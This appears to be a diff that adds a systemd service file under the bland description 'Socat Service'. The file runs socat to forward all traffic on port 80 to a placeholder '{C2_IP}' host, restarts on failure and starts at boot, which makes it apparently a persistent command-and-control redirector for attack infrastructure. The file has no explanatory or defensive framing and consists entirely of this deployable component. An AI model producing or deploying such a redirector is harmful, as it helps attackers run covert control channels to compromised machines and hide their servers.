@@ -1,0 +1,12 @@
+[Unit]
+Description=Socat Service
+
+[Service]
+Type=simple
+User=user  
+ExecStart=/usr/bin/socat TCP4-LISTEN:80,fork TCP4:{C2_IP}:80
+Restart=always
+RestartSec=10
+
+[Install]
+WantedBy=multi-user.target 
